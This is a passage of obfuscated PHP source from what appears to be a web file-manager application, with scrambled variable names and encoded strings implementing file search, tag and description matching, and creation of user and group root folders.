$šâ½îÎ´ = array_to_keyvalue_group($Äë·Ôé¡, $ºæÅù’©[525]); $²ƒàòÍ€ = array(); $°–í¡ğ– = array(); foreach ($šâ½îÎ´ as $‚ÉÊ€¨) { if (!$‚ÉÊ€¨ || count($‚ÉÊ€¨) <= 1) { continue; } foreach ($‚ÉÊ€¨ as $ö‰ÑÖÑ½) { $²ƒàòÍ€[] = $ö‰ÑÖÑ½[$ºæÅù’©[525]]; $°–í¡ğ–[] = $ö‰ÑÖÑ½[$ºæÅù’©[459]]; } } if (!$°–í¡ğ–) { return; } $this->where(array($ºæÅù’©[459] => array($ºæÅù’©[7], $°–í¡ğ–)))->delete(); Model($ºæÅù’©[528])->remove($²ƒàòÍ€); } public function userSpace() { $­ğÛ©œ =& $_SERVER[÷åé¼î]; $éæ…õ¸ = $this->tablePrefix; $İù÷¶Âª = array($­ğÛ©œ[1770] => USER_ID); $Ğş…—Œè = "{$éæ…õ¸}\151\x6f\137\146\151\x6c\x65\x20\x66\151\154\x65\163\40\157\x6e\40\x66\151\x6c\x65\163\x2e\x66\x69\x6c\x65\111\x44\x20\x3d\x20\x68\151\163\x74\157\x72\171\56\x66\x69\x6c\145\111\104"; return $this->alias($­ğÛ©œ[2236])->where($İù÷¶Âª)->join($Ğş…—Œè, $­ğÛ©œ[2237])->sum($­ğÛ©œ[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ıÀ¨¢Œ) { $ŠŠÛ‹µ³ =& $_SERVER[÷åé¼î]; $šƒÇÎƒ = KodIO::fileTypeList(); $‡²óµªË = $šƒÇÎƒ[$ıÀ¨¢Œ]; if (!$‡²óµªË) { return array(); } $ëäÁí¾“ = $‡²óµªË[$ŠŠÛ‹µ³[169]]; $¾Ê¤Ä¯¨ = $ŠŠÛ‹µ³[7]; if (!$‡²óµªË[$ŠŠÛ‹µ³[169]]) { $¤ãŸƒÂÍ = array_to_keyvalue($šƒÇÎƒ, $ŠŠÛ‹µ³[12], $ŠŠÛ‹µ³[169]); $ëäÁí¾“ = implode($ŠŠÛ‹µ³[50], $¤ãŸƒÂÍ); $¾Ê¤Ä¯¨ = $ŠŠÛ‹µ³[2239]; } $ô©ÔÕÌ– = explode($ŠŠÛ‹µ³[50], trim($ëäÁí¾“, $ŠŠÛ‹µ³[50])); return array($¾Ê¤Ä¯¨, $ô©ÔÕÌ–); } public function listPathType($ßĞı°Œè) { $ıßÆèœø =& $_SERVER[÷åé¼î]; $ê‘­ÂÈÌ = $this->fileTypeWhere($ßĞı°Œè); if (!$ê‘­ÂÈÌ) { return array(); } $¦öÑåæ© = USER_ID; $•ã§¹úâ = Model($ıßÆèœø[582])->getInfo($¦öÑåæ©); $ˆ‡Şò¢ = array($ıßÆèœø[632] => SourceModel::TYPE_USER, $ıßÆèœø[568] => array($ıßÆèœø[596], $ıßÆèœø[578] . $•ã§¹úâ[$ıßÆèœø[90]][$ıßÆèœø[193]] . $ıßÆèœø[597]), $ıßÆèœø[633] => $¦öÑåæ©, $ıßÆèœø[630] => 0, $ıßÆèœø[631] => $ê‘­ÂÈÌ); return $this->listSource($ˆ‡Şò¢); } public function listSearch($˜¹¾ã™, $³Ù´«Êª = 300) { $ªæèà’­ =& $_SERVER[÷åé¼î]; if (isset($˜¹¾ã™[$ªæèà’­[2075]]) && $˜¹¾ã™[$ªæèà’­[2075]]) { $˜¹¾ã™[$ªæèà’­[2075]] = str_replace($ªæèà’­[444], $ªæèà’­[2240], trim($˜¹¾ã™[$ªæèà’­[2075]])); } $Û¿Œ¥ÉÑ = $this->_parseSearchWhere($˜¹¾ã™); if (!isset($Û¿Œ¥ÉÑ[$ªæèà’­[489]])) { $Û¿Œ¥ÉÑ[$ªæèà’­[489]] = 0; } $Ş‰öŠ = $ªæèà’­[2241]; $ÂÛŠ¹ = $Û¿Œ¥ÉÑ; $¦ï™·Š = $Ş‰öŠ; $this->_listSearchBindPinyin($˜¹¾ã™, $Û¿Œ¥ÉÑ, $Ş‰öŠ); $this->alias($ªæèà’­[503])->_makeOrder(); $Û¿Œ¥ÉÑ = $this->parseWhereLike($Û¿Œ¥ÉÑ); $’©à¨ú = $this->distinct(!0)->field($Ş‰öŠ)->where($Û¿Œ¥ÉÑ)->selectPage($³Ù´«Êª); if ($GLOBALS[$ªæèà’­[6]][$ªæèà’­[441]][$ªæèà’­[442]] && Input::check($˜¹¾ã™[$ªæèà’­[2075]], $ªæèà’­[639]) && $’©à¨ú[$ªæèà’­[426]][$ªæèà’­[413]] == 1 && $’©à¨ú[$ªæèà’­[426]][$ªæèà’­[427]] == 0) { $’©à¨ú = $this->distinct(!0)->field($Ş‰öŠ)->where($ÂÛŠ¹)->limit(1000)->select(); $’©à¨ú = array_page_split($’©à¨ú, !1, $³Ù´«Êª); } $this->_listSearchFileContent($’©à¨ú, $˜¹¾ã™, $¦ï™·Š, $ÂÛŠ¹); $this->_listSearchDesc($’©à¨ú, $˜¹¾ã™, $¦ï™·Š); $this->_listSearchTag($’©à¨ú, $˜¹¾ã™, $¦ï™·Š); $this->_listSearchGroupTag($’©à¨ú, $˜¹¾ã™, $¦ï™·Š); $this->_listDataApply($’©à¨ú[$ªæèà’­[429]]); $this->_listMake($’©à¨ú); return $’©à¨ú; } private function _listSearchFileContent(&$ø´ü¶», $»‚•³¼î, $ÇØâÒæ€, $³¤“Ş¼µ) { $ßÇè¢‚ =& $_SERVER[÷åé¼î]; if (!$»‚•³¼î[$ßÇè¢‚[2075]] || $ø´ü¶»[$ßÇè¢‚[426]][$ßÇè¢‚[413]] > 1) { return; } if (!isset($³¤“Ş¼µ[$ßÇè¢‚[32]]) || !is_array($»‚•³¼î[$ßÇè¢‚[525]])) { return; } $³¤“Ş¼µ[$ßÇè¢‚[525]] = array($ßÇè¢‚[7], $»‚•³¼î[$ßÇè¢‚[525]]); unset($³¤“Ş¼µ[$ßÇè¢‚[32]]); unset($»‚•³¼î[$ßÇè¢‚[525]]); $ƒ¥¦ÉìÛ = $this->field($ÇØâÒæ€)->where($³¤“Ş¼µ)->limit($ßÇè¢‚[2242])->select(); if (!$ƒ¥¦ÉìÛ || count($ƒ¥¦ÉìÛ) == 0) { return; } $ø´ü¶»[$ßÇè¢‚[429]] = array_merge($ƒ¥¦ÉìÛ, $ø´ü¶»[$ßÇè¢‚[429]]); $ø´ü¶»[$ßÇè¢‚[426]][$ßÇè¢‚[427]] += count($ƒ¥¦ÉìÛ); } private function _listSearchTag(&$ØÛ–§×ç, $‚î…¦üô, $øß°Ş„™) { $À‚‰†ÅÑ =& $_SERVER[÷åé¼î]; if (!$‚î…¦üô[$À‚‰†ÅÑ[2075]] || $ØÛ–§×ç[$À‚‰†ÅÑ[426]][$À‚‰†ÅÑ[413]] > 1) { return; } $±à½ ûù = Model($À‚‰†ÅÑ[2243])->listData(); $ˆîÕ˜ò = array(); $ô‰‡î‰ = $‚î…¦üô[$À‚‰†ÅÑ[2075]]; foreach ($±à½ ûù as $•İ»ëÉè) { $»¤‹Á† = $•İ»ëÉè[$À‚‰†ÅÑ[32]]; $ÄµúßÇ° = str_replace($À‚‰†ÅÑ[53], $À‚‰†ÅÑ[12], Pinyin::get($»¤‹Á†)); if (stripos($»¤‹Á†, $ô‰‡î‰) !== !1 || stripos($ÄµúßÇ°, $ô‰‡î‰) !== !1) { $ˆîÕ˜ò[] = $•İ»ëÉè[$À‚‰†ÅÑ[459]]; } } if (!$ˆîÕ˜ò) { return; } $Í ØĞ‡ = array($À‚‰†ÅÑ[484] => array($À‚‰†ÅÑ[7], $ˆîÕ˜ò), $À‚‰†ÅÑ[1779] => USER_ID); $·Â‡ºª· = Model($À‚‰†ÅÑ[486])->field($À‚‰†ÅÑ[87])->where($Í ØĞ‡)->select(); $·Â‡ºª· = array_to_keyvalue($·Â‡ºª·, $À‚‰†ÅÑ[12], $À‚‰†ÅÑ[87]); $ûê½‰¼ö = array_unique($·Â‡ºª·); $this->_listSearchMerge($ØÛ–§×ç, $‚î…¦üô, $øß°Ş„™, $ûê½‰¼ö); } private function _listSearchDesc(&$¿‡‘€¸º, $È†ëèó‡, $¸¿¥™åØ) { $«Ü›—ğ =& $_SERVER[÷åé¼î]; if (!$È†ëèó‡[$«Ü›—ğ[2075]] || $¿‡‘€¸º[$«Ü›—ğ[426]][$«Ü›—ğ[413]] > 1) { return; } $Ç½ù²¦Ñ = array($«Ü›—ğ[97] => $«Ü›—ğ[510], $«Ü›—ğ[434] => array($«Ü›—ğ[443], $«Ü›—ğ[2077] . $È†ëèó‡[$«Ü›—ğ[2075]] . $«Ü›—ğ[2077])); $äîö›±à = !1; if ($äîö›±à) { $„êÊ¦¢ğ = $this->listSearchChildren($È†ëèó‡[$«Ü›—ğ[192]]); $„êÊ¦¢ğ = array_unique($„êÊ¦¢ğ); if (!$„êÊ¦¢ğ) { return; } $Ç½ù²¦Ñ[$«Ü›—ğ[193]] = array($«Ü›—ğ[7], $„êÊ¦¢ğ); } $®©Ÿ«Â± = Model($«Ü›—ğ[616])->field($«Ü›—ğ[193])->where($Ç½ù²¦Ñ)->limit(5000)->select(); $™ªÒÏêœ = array_to_keyvalue($®©Ÿ«Â±, $«Ü›—ğ[12], $«Ü›—ğ[193]); $this->_listSearchMerge($¿‡‘€¸º, $È†ëèó‡, $¸¿¥™åØ, $™ªÒÏêœ); } private function _listSearchGroupTag(&$Æ™üª, $äßºš÷¢, $µ¦ÖÂ‘÷) { $Ô±”•„¡ =& $_SERVER[÷åé¼î]; if (!$äßºš÷¢[$Ô±”•„¡[2075]] || $Æ™üª[$Ô±”•„¡[426]][$Ô±”•„¡[413]] > 1 || !$äßºš÷¢[$Ô±”•„¡[192]]) { return; } $ĞºëŞœ = $this->sourceInfo($äßºš÷¢[$Ô±”•„¡[192]]); if (!$ĞºëŞœ || $ĞºëŞœ[$Ô±”•„¡[190]] != SourceModel::TYPE_GROUP) { return; } $Ë€ï¯ûŸ = $ĞºëŞœ[$Ô±”•„¡[553]]; $À•’üˆ· = Model($Ô±”•„¡[2244])->get($Ë€ï¯ûŸ); $”îÃ¨Ş = array(); $ŞŠ’†ûÃ = $äßºš÷¢[$Ô±”•„¡[2075]]; foreach ($À•’üˆ·[$Ô±”•„¡[429]] as $½ßúÛòÄ) { $ßıĞæ² = $½ßúÛòÄ[$Ô±”•„¡[32]]; $Û¿ìßû = str_replace($Ô±”•„¡[53], $Ô±”•„¡[12], Pinyin::get($ßıĞæ²)); if (stripos($ßıĞæ², $ŞŠ’†ûÃ) !== !1 || stripos($Û¿ìßû, $ŞŠ’†ûÃ) !== !1) { $”îÃ¨Ş[] = $½ßúÛòÄ[$Ô±”•„¡[459]]; } } if (!$”îÃ¨Ş) { return; } $»èîÜ±­ = array($Ô±”•„¡[484] => array($Ô±”•„¡[7], $”îÃ¨Ş), $Ô±”•„¡[1779] => 0, $Ô±”•„¡[33] => $Ô±”•„¡[2097] . $Ë€ï¯ûŸ); $–ø«è©ß = Model($Ô±”•„¡[486])->field($Ô±”•„¡[87])->where($»èîÜ±­)->select(); $–ø«è©ß = array_to_keyvalue($–ø«è©ß, $Ô±”•„¡[12], $Ô±”•„¡[87]); $Â®‹íû = array_unique($–ø«è©ß); $this->_listSearchMerge($Æ™üª, $äßºš÷¢, $µ¦ÖÂ‘÷, $Â®‹íû); } private function _listSearchMerge(&$˜Îªåë, $çÉıÕ›, $×‹òÆ­¹, $£ŸÊÀÚ) { $›ºéµİ =& $_SERVER[÷åé¼î]; if (!$£ŸÊÀÚ) { return; } $½èœüÂ = array_to_keyvalue($˜Îªåë[$›ºéµİ[429]], $›ºéµİ[12], $›ºéµİ[193]); $…µ£¬® = array_diff($£ŸÊÀÚ, $½èœüÂ); if (!$…µ£¬®) { return; } $©óŸˆ²ì = array($›ºéµİ[193] => array($›ºéµİ[7], $…µ£¬®)); $»Ÿº·¡¢ = $this->field($×‹òÆ­¹)->where($©óŸˆ²ì)->select(); if (!$»Ÿº·¡¢) { return; } $—µ—‡Ä¥ = array(); foreach ($»Ÿº·¡¢ as $¤ñ¨ßºË) { if ($this->_listSearchFilter($¤ñ¨ßºË, $çÉıÕ›)) { $—µ—‡Ä¥[] = $¤ñ¨ßºË; } } $˜Îªåë[$›ºéµİ[429]] = array_merge($—µ—‡Ä¥, $˜Îªåë[$›ºéµİ[429]]); $˜Îªåë[$›ºéµİ[426]][$›ºéµİ[427]] += count($—µ—‡Ä¥); } private function _listSearchFilter($··óº›Ş, $½È‰¼‘”) { $Éˆ³®Û’ =& $_SERVER[÷åé¼î]; $íı‚âáˆ = $··óº›Ş[$Éˆ³®Û’[469]] == $Éˆ³®Û’[91]; if (!strstr($··óº›Ş[$Éˆ³®Û’[568]], $Éˆ³®Û’[50] . $½È‰¼‘”[$Éˆ³®Û’[192]] . $Éˆ³®Û’[50])) { return !1; } if (isset($½È‰¼‘”[$Éˆ³®Û’[470]]) && $½È‰¼‘”[$Éˆ³®Û’[470]] != $Éˆ³®Û’[841]) { if ($½È‰¼‘”[$Éˆ³®Û’[470]] == $Éˆ³®Û’[78] && !$íı‚âáˆ) { return !1; } if ($½È‰¼‘”[$Éˆ³®Û’[470]] != $Éˆ³®Û’[78] && $íı‚âáˆ) { return !1; } if (!strstr($··óº›Ş[$Éˆ³®Û’[169]], $Éˆ³®Û’[50] . $½È‰¼‘”[$Éˆ³®Û’[470]] . $Éˆ³®Û’[50])) { return !1; } } if (isset($½È‰¼‘”[$Éˆ³®Û’[2245]]) && $½È‰¼‘”[$Éˆ³®Û’[2245]] < $··óº›Ş[$Éˆ³®Û’[79]]) { return !1; } if (isset($½È‰¼‘”[$Éˆ³®Û’[2246]]) && $½È‰¼‘”[$Éˆ³®Û’[2246]] > $··óº›Ş[$Éˆ³®Û’[79]]) { return !1; } if (isset($½È‰¼‘”[$Éˆ³®Û’[646]]) && $½È‰¼‘”[$Éˆ³®Û’[646]] != $··óº›Ş[$Éˆ³®Û’[513]]) { return !1; } return !0; } public function listSearchChildren($¥¨½É—ù, $ª·ğÕüó = 5000) { $İÎî÷² =& $_SERVER[÷åé¼î]; $×ªÆ‚× = array(); $ø°ÕÇ‹ = $this->sourceInfo($¥¨½É—ù); $½¯úÙÅ° = array($İÎî÷²[568] => array($İÎî÷²[443], $ø°ÕÇ‹[$İÎî÷²[568]] . $ø°ÕÇ‹[$İÎî÷²[193]] . $İÎî÷²[597])); $Êıİ¦¦û = $this->field($İÎî÷²[79])->where($½¯úÙÅ°)->limit($ª·ğÕüó + 1)->select(); $Œœ÷®ÒÔ = is_array($Êıİ¦¦û) ? count($Êıİ¦¦û) : 0; if ($Œœ÷®ÒÔ > $ª·ğÕüó) { return $this->_listSearchChildrenNear($¥¨½É—ù, $ª·ğÕüó); } $åé¿²Ğ¯ = $this->field($İÎî÷²[193])->where($½¯úÙÅ°)->select(); $×ªÆ‚× = array_to_keyvalue($åé¿²Ğ¯, $İÎî÷²[12], $İÎî÷²[193]); return $×ªÆ‚×; } private function _listSearchChildrenNear($œ±Ââ›ì, $ñŸé…¨Š) { $ÖÅ¬ìˆ =& $_SERVER[÷åé¼î]; $Şª¿ÅÚ‡ = array(); $ô¼ªô“Î = array($ÖÅ¬ìˆ[192] => $œ±Ââ›ì); $Á¼£ËĞí = $this->field($ÖÅ¬ìˆ[2247])->where($ô¼ªô“Î)->select(); $ÕÊ’í½ = array_to_keyvalue(array_filter_by_field($Á¼£ËĞí, $ÖÅ¬ìˆ[469], $ÖÅ¬ìˆ[91]), $ÖÅ¬ìˆ[12], $ÖÅ¬ìˆ[193]); $Şª¿ÅÚ‡ = array_merge($Şª¿ÅÚ‡, array_to_keyvalue($Á¼£ËĞí, $ÖÅ¬ìˆ[12], $ÖÅ¬ìˆ[193])); if (!$ÕÊ’í½) { return $Şª¿ÅÚ‡; } $ô¼ªô“Î = array($ÖÅ¬ìˆ[192] => array($ÖÅ¬ìˆ[7], $ÕÊ’í½)); $Á¼£ËĞí = $this->field($ÖÅ¬ìˆ[2247])->where($ô¼ªô“Î)->limit($ñŸé…¨Š)->select(); $Şª¿ÅÚ‡ = array_merge($Şª¿ÅÚ‡, array_to_keyvalue($Á¼£ËĞí, $ÖÅ¬ìˆ[12], $ÖÅ¬ìˆ[193])); $Şª¿ÅÚ‡ = array_slice($Şª¿ÅÚ‡, 0, intval($ñŸé…¨Š)); return $Şª¿ÅÚ‡; } private function _listSearchBindPinyin($ƒÌÒà, &$ƒº¡²ûñ, &$•ş†ÀŸÀ) { $¸õŞÜª› =& $_SERVER[÷åé¼î]; if (!isset($ƒÌÒà[$¸õŞÜª›[2075]]) || !$ƒÌÒà[$¸õŞÜª›[2075]]) { return; } if (!Input::check($ƒÌÒà[$¸õŞÜª›[2075]], $¸õŞÜª›[378]) || strlen($ƒÌÒà[$¸õŞÜª›[2075]]) < 2) { return; } $ÀŒåË—Ü = "\x4c\105\106\x54\40\112\x4f\111\x4e\x20{$this->tablePrefix}\x69\x6f\137\163\x6f\x75\162\x63\x65\137\155\145\x74\141\x20\155\x65\x74\141\x20\157\156\40\x73\x6f\165\162\x63\x65\x2e\x73\157\x75\162\143\x65\111\x44\40\75\40\x6d\145\x74\x61\56\163\x6f\165\x72\x63\x65\111\x44"; $Ş˜Œ¾â— = array(); $•ş†ÀŸÀ = str_replace(array($¸õŞÜª›[262], $¸õŞÜª›[53], $¸õŞÜª›[2248]), $¸õŞÜª›[12], $•ş†ÀŸÀ); $•ş†ÀŸÀ = $¸õŞÜª›[495] . str_replace($¸õŞÜª›[50], $¸õŞÜª›[496], $•ş†ÀŸÀ); $¿©õ·øï = $ƒº¡²ûñ[$¸õŞÜª›[32]]; unset($ƒº¡²ûñ[$¸õŞÜª›[32]]); foreach ($ƒº¡²ûñ as $ É†¸ƒ => $™¾Ö) { $Ş˜Œ¾â—[$¸õŞÜª›[495] . $ É†¸ƒ] = $™¾Ö; } foreach ($¿©õ·øï as $“’Õ‡Õ¸) { $Ş˜Œ¾â—[] = array($¸õŞÜª›[500] => $“’Õ‡Õ¸, $¸õŞÜª›[1072] => $¸õŞÜª›[2079], array($¸õŞÜª›[2249] => $“’Õ‡Õ¸, $¸õŞÜª›[2250] => array($¸õŞÜª›[7], array($¸õŞÜª›[522], $¸õŞÜª›[521])))); } $this->join($ÀŒåË—Ü); $ƒº¡²ûñ = $Ş˜Œ¾â—; } private function _parseSearchWhere($øĞÉ¤ğş) { $£ä»˜¢‘ =& $_SERVER[÷åé¼î]; $¾™ ®ÚŠ = array(); if (isset($øĞÉ¤ğş[$£ä»˜¢‘[825]]) && $øĞÉ¤ğş[$£ä»˜¢‘[825]]) { $¾™ ®ÚŠ[$£ä»˜¢‘[88]] = array($£ä»˜¢‘[2251], $øĞÉ¤ğş[$£ä»˜¢‘[825]]); } if (isset($øĞÉ¤ğş[$£ä»˜¢‘[826]]) && $øĞÉ¤ğş[$£ä»˜¢‘[826]]) { $Ç»µ´£ = array($£ä»˜¢‘[2252], $øĞÉ¤ğş[$£ä»˜¢‘[826]]); if ($¾™ ®ÚŠ[$£ä»˜¢‘[88]]) { $¾™ ®ÚŠ[$£ä»˜¢‘[88]] = array($¾™ ®ÚŠ[$£ä»˜¢‘[88]], $Ç»µ´£, $£ä»˜¢‘[2253]); } else { $¾™ ®ÚŠ[$£ä»˜¢‘[88]] = $Ç»µ´£; } } if (isset($øĞÉ¤ğş[$£ä»˜¢‘[2245]]) && $øĞÉ¤ğş[$£ä»˜¢‘[2245]] > 0) { $¾™ ®ÚŠ[$£ä»˜¢‘[79]] = array($£ä»˜¢‘[2251], $øĞÉ¤ğş[$£ä»˜¢‘[2245]]); } if (isset($øĞÉ¤ğş[$£ä»˜¢‘[2246]]) && $øĞÉ¤ğş[$£ä»˜¢‘[2246]]) { $Ç»µ´£ = array($£ä»˜¢‘[2252], $øĞÉ¤ğş[$£ä»˜¢‘[2246]]); if ($¾™ ®ÚŠ[$£ä»˜¢‘[79]]) { $¾™ ®ÚŠ[$£ä»˜¢‘[79]] = array($¾™ ®ÚŠ[$£ä»˜¢‘[79]], $Ç»µ´£, $£ä»˜¢‘[2253]); } else { $¾™ ®ÚŠ[$£ä»˜¢‘[79]] = $Ç»µ´£; } } if (isset($øĞÉ¤ğş[$£ä»˜¢‘[646]]) && $øĞÉ¤ğş[$£ä»˜¢‘[646]]) { $¾™ ®ÚŠ[] = array($£ä»˜¢‘[513] => $øĞÉ¤ğş[$£ä»˜¢‘[646]], $£ä»˜¢‘[511] => $øĞÉ¤ğş[$£ä»˜¢‘[646]], $£ä»˜¢‘[1072] => $£ä»˜¢‘[2079]); } if (isset($øĞÉ¤ğş[$£ä»˜¢‘[470]]) && $øĞÉ¤ğş[$£ä»˜¢‘[470]]) { $Ñ§ìó  = $øĞÉ¤ğş[$£ä»˜¢‘[470]]; if ($Ñ§ìó  == $£ä»˜¢‘[78]) { $¾™ ®ÚŠ[$£ä»˜¢‘[469]] = 1; } else { if ($Ñ§ìó  == $£ä»˜¢‘[2254]) { $¾™ ®ÚŠ[$£ä»˜¢‘[469]] = 0; } else { if ($Ñ§ìó ) { $Ñ§ìó  = is_array($Ñ§ìó ) ? $Ñ§ìó  : explode($£ä»˜¢‘[50], $Ñ§ìó ); $¾™ ®ÚŠ[$£ä»˜¢‘[470]] = array($£ä»˜¢‘[476], $Ñ§ìó ); $¾™ ®ÚŠ[$£ä»˜¢‘[469]] = 0; } } } } $this->_parseSearchParent($øĞÉ¤ğş, $¾™ ®ÚŠ); if (isset($øĞÉ¤ğş[$£ä»˜¢‘[2075]]) && trim($øĞÉ¤ğş[$£ä»˜¢‘[2075]])) { $±ŠÁ±Ø¢ = trim($øĞÉ¤ğş[$£ä»˜¢‘[2075]]); $Ššæ­¥Û = explode($£ä»˜¢‘[53], $±ŠÁ±Ø¢); if (strlen($±ŠÁ±Ø¢) > 2 && (substr($±ŠÁ±Ø¢, 0, 1) == $£ä»˜¢‘[121] && substr($±ŠÁ±Ø¢, -1) == $£ä»˜¢‘[121]) || substr($±ŠÁ±Ø¢, 0, 1) == $£ä»˜¢‘[58] && substr($±ŠÁ±Ø¢, -1) == $£ä»˜¢‘[58]) { $±ŠÁ±Ø¢ = substr($±ŠÁ±Ø¢, 1, -1); $Ššæ­¥Û = array($±ŠÁ±Ø¢); } $¾™ ®ÚŠ[$£ä»˜¢‘[32]] = array(array($£ä»˜¢‘[596], $£ä»˜¢‘[2077] . $±ŠÁ±Ø¢ . $£ä»˜¢‘[2077])); if (count($Ššæ­¥Û) > 1) { $¾™ ®ÚŠ[$£ä»˜¢‘[32]] = array(); foreach ($Ššæ­¥Û as $ÔßŞ¢ğæ) { if (!trim($ÔßŞ¢ğæ)) { continue; } $¾™ ®ÚŠ[$£ä»˜¢‘[32]][] = array($£ä»˜¢‘[596], $£ä»˜¢‘[2077] . trim($ÔßŞ¢ğæ) . $£ä»˜¢‘[2077]); } } } return $¾™ ®ÚŠ; } private function _parseSearchParent($ù”»šÁ, &$Íª›¹Ïü) { $«¨’Ã¾Ú =& $_SERVER[÷åé¼î]; if (!isset($ù”»šÁ[$«¨’Ã¾Ú[192]]) || !$ù”»šÁ[$«¨’Ã¾Ú[192]]) { return; } $ÍŠù¢Î = $this->pathInfo($ù”»šÁ[$«¨’Ã¾Ú[192]]); $´õ„Òõ¨ = $ÍŠù¢Î[$«¨’Ã¾Ú[192]] . $«¨’Ã¾Ú[12] === $«¨’Ã¾Ú[228]; $›ÈÉó¹á = $ÍŠù¢Î[$«¨’Ã¾Ú[190]] == $«¨’Ã¾Ú[562]; if ($ÍŠù¢Î[$«¨’Ã¾Ú[579]] == $«¨’Ã¾Ú[580]) { $É˜°®õ = $this->sourceInfo($ù”»šÁ[$«¨’Ã¾Ú[192]]); $ÍŠù¢Î[$«¨’Ã¾Ú[568]] = $É˜°®õ[$«¨’Ã¾Ú[568]]; } $Íª›¹Ïü[$«¨’Ã¾Ú[636]] = array($«¨’Ã¾Ú[596], $ÍŠù¢Î[$«¨’Ã¾Ú[568]] . $ù”»šÁ[$«¨’Ã¾Ú[192]] . $«¨’Ã¾Ú[597]); $Í‰¾âÆ§ = isset($ù”»šÁ[$«¨’Ã¾Ú[1936]]) && in_array($«¨’Ã¾Ú[562], $ù”»šÁ[$«¨’Ã¾Ú[1936]]); if (!$Í‰¾âÆ§ || !$›ÈÉó¹á || !$´õ„Òõ¨ || !$ÍŠù¢Î[$«¨’Ã¾Ú[471]]) { return; } if (!AuthModel::authCheckRoot($ÍŠù¢Î[$«¨’Ã¾Ú[471]][$«¨’Ã¾Ú[472]])) { return; } $ï×Î‘ãÂ = $ÍŠù¢Î[$«¨’Ã¾Ú[553]] . $«¨’Ã¾Ú[12]; if ($ï×Î‘ãÂ == $«¨’Ã¾Ú[91]) { unset($Íª›¹Ïü[$«¨’Ã¾Ú[636]]); $Íª›¹Ïü[$«¨’Ã¾Ú[190]] = self::TYPE_GROUP; return; } $®¾ÑôÖÕ = Model($«¨’Ã¾Ú[569])->groupChildrenAll($ï×Î‘ãÂ); $ú†Ö–µÔ = count($®¾ÑôÖÕ); if ($ú†Ö–µÔ <= 1) { return; } $¸Ö•™¥¾ = array($«¨’Ã¾Ú[192] => 0, $«¨’Ã¾Ú[190] => self::TYPE_GROUP, $«¨’Ã¾Ú[553] => array($«¨’Ã¾Ú[7], $®¾ÑôÖÕ)); $“ı‹Ğ›ê = $this->field($«¨’Ã¾Ú[2255])->where($¸Ö•™¥¾)->limit($ú†Ö–µÔ)->select(); $Íª›¹Ïü[$«¨’Ã¾Ú[636]] = array(); foreach ($“ı‹Ğ›ê as $»‚·Ğ˜) { $Íª›¹Ïü[$«¨’Ã¾Ú[636]][] = array($«¨’Ã¾Ú[596], $«¨’Ã¾Ú[578] . $»‚·Ğ˜[$«¨’Ã¾Ú[193]] . $«¨’Ã¾Ú[597]); } $Íª›¹Ïü[$«¨’Ã¾Ú[636]][] = $«¨’Ã¾Ú[2079]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ıñ‹®) { $÷Ğ²®” =& $_SERVER[÷åé¼î]; $¨ø‡ìÑß = Model($÷Ğ²®”[561])->where(array($÷Ğ²®”[1770] => $ıñ‹®))->find(); $ “¼¢è¢ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ıñ‹®, $¨ø‡ìÑß[$÷Ğ²®”[32]]); $this->userDesktopAdd($ “¼¢è¢); return $ “¼¢è¢; } public function userDesktopAdd($ŸÜÚ‰ô) { $‹Ùï¦˜ =& $_SERVER[÷åé¼î]; $İƒã™ğ¤ = LNG($‹Ùï¦˜[2256]); $ŸöŞ²€¸ = $this->mkdir($ŸÜÚ‰ô, $İƒã™ğ¤); $this->metaSet($ŸöŞ²€¸, $‹Ùï¦˜[2257], $‹Ùï¦˜[91]); $this->metaSet($ŸÜÚ‰ô, $‹Ùï¦˜[2258], $ŸöŞ²€¸); } public function userPathSafeAdd($‹Ô›Áõ©) { $è»®…—í =& $_SERVER[÷åé¼î]; $Û¿ªªà‘ = Model($è»®…—í[561])->getInfoFull($‹Ô›Áõ©); if (!$Û¿ªªà‘) { return !1; } if (_get($Û¿ªªà‘, $è»®…—í[583])) { return $Û¿ªªà‘[$è»®…—í[523]][$è»®…—í[2259]]; } $Ëõ–µéõ = $this->_mkdirRoot(SourceModel::TYPE_USER, $‹Ô›Áõ©, $è»®…—í[2260], $è»®…—í[490]); Model($è»®…—í[561])->metaSet($‹Ô›Áõ©, $è»®…—í[2259], $Ëõ–µéõ); $this->metaSet($Ëõ–µéõ, $è»®…—í[2261], $‹Ô›Áõ©); return $Ëõ–µéõ; } public function groupRootAdd($¢ÁèÒÄü) { $üŒ‰ÅÇÈ =& $_SERVER[÷åé¼î]; $ÇËÌ¢šæ = Model($üŒ‰ÅÇÈ[569])->where(array($üŒ‰ÅÇÈ[2069] => $¢ÁèÒÄü))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¢ÁèÒÄü, $ÇËÌ¢šæ[$üŒ‰ÅÇÈ[32]]); } public function systemRootPathAdd($–¤¸§ï) { if ($–¤¸§ï != $_SERVER[÷åé¼î][589]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $–¤¸§ï); } public function userRootRemove($ŸŸëüƒ¿) { $Í¨Œ¹¢é = $this->targetSourceRoot(SourceModel::TYPE_USER, $ŸŸëüƒ¿, !0); foreach ($Í¨Œ¹¢é as $´°£ã¿”) { if (!$´°£ã¿”) { continue; } $this->remove($´°£ã¿”[$_SERVER[÷åé¼î][193]], !1); } } public function groupRootRemove($ĞíÛ’’´) { $ıªóóÈş = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ĞíÛ’’´); if (!$ıªóóÈş) { return; } $this->remove($ıªóóÈş[$_SERVER[÷åé¼î][193]], !1); } private function _mkdirRoot($Ê¸áªà, $ºãğØàĞ, $¨„«º“’, $ğ™¼ş—÷ = '') { $Ö¢¥ò¹º =& $_SERVER[÷åé¼î]; $Ï«†ãÒò = defined($Ö¢¥ò¹º[2203]) ? USER_ID : 0; $èíàé„ = array($Ö¢¥ò¹º[461] => 0, $Ö¢¥ò¹º[632] => $Ê¸áªà, $Ö¢¥ò¹º[633] => $ºãğØàĞ, $Ö¢¥ò¹º[630] => 1, $Ö¢¥ò¹º[634] => $Ï«†ãÒò, $Ö¢¥ò¹º[635] => $Ï«†ãÒò, $Ö¢¥ò¹º[631] => $ğ™¼ş—÷, $Ö¢¥ò¹º[636] => $Ö¢¥ò¹º[578], $Ö¢¥ò¹º[488] => 0, $Ö¢¥ò¹º[601] => 0, $Ö¢¥ò¹º[526] => 0, $Ö¢¥ò¹º[637] => $Ö¢¥ò¹º[12]); if ($•¡« = $this->where($èíàé„)->find()) { return 